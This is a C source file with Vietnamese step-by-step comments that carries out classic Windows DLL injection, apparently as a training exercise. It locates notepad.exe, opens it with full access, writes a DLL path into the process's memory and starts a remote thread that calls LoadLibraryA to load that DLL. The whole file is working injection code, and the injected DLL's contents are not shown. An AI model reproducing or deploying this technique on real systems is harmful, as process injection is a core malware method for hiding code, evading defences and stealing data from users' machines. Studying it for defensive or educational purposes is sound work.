#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Tìm PID của process (sử dụng CreateToolhelp32Snapshot)
DWORD FindProcessId(const char* processName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID; 
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    const char* targetProcess = "notepad.exe"; // Target process 
    const char* dllPath = "C:\\Users\\DELL\\Downloads\\VCS\\loaddll.dll";
    
    // BƯỚC 1: Tìm PID
    DWORD pid = FindProcessId(targetProcess);
    if (pid == 0) {
        return 1;
    }
    printf("[+] Tim thay PID: %d\n", pid);

    // BƯỚC 2: OpenProcess - Lấy handle của process mục tiêu
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        return 1;
    }

    // BƯỚC 3: VirtualAllocEx - Cấp phát bộ nhớ trong process mục tiêu
    // Kích thước = độ dài đường dẫn string + 1 (null terminator)
    size_t pathLen = strlen(dllPath) + 1;
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (pRemoteMem == NULL) {
        CloseHandle(hProcess);
        return 1;
    }

    // BƯỚC 4: WriteProcessMemory - Ghi đường dẫn DLL vào vùng nhớ vừa cấp phát
    if (!WriteProcessMemory(hProcess, pRemoteMem, dllPath, pathLen, NULL)) {
        printf("[-] WriteProcessMemory that bai. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // BƯỚC 5: Lấy địa chỉ hàm LoadLibraryA
    // LoadLibraryA nằm trong kernel32.dll
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    
    if (pLoadLibrary == NULL) {
        return 1;
    }

    // BƯỚC 6: CreateRemoteThread - Tạo thread mới trong target process để chạy LoadLibraryA
    // Tham số truyền vào cho LoadLibraryA chính là địa chỉ bộ nhớ chứa đường dẫn DLL (pRemoteMem)
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                        (LPTHREAD_START_ROUTINE)pLoadLibrary, 
                                        pRemoteMem, 0, NULL);

    if (hThread == NULL) {
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
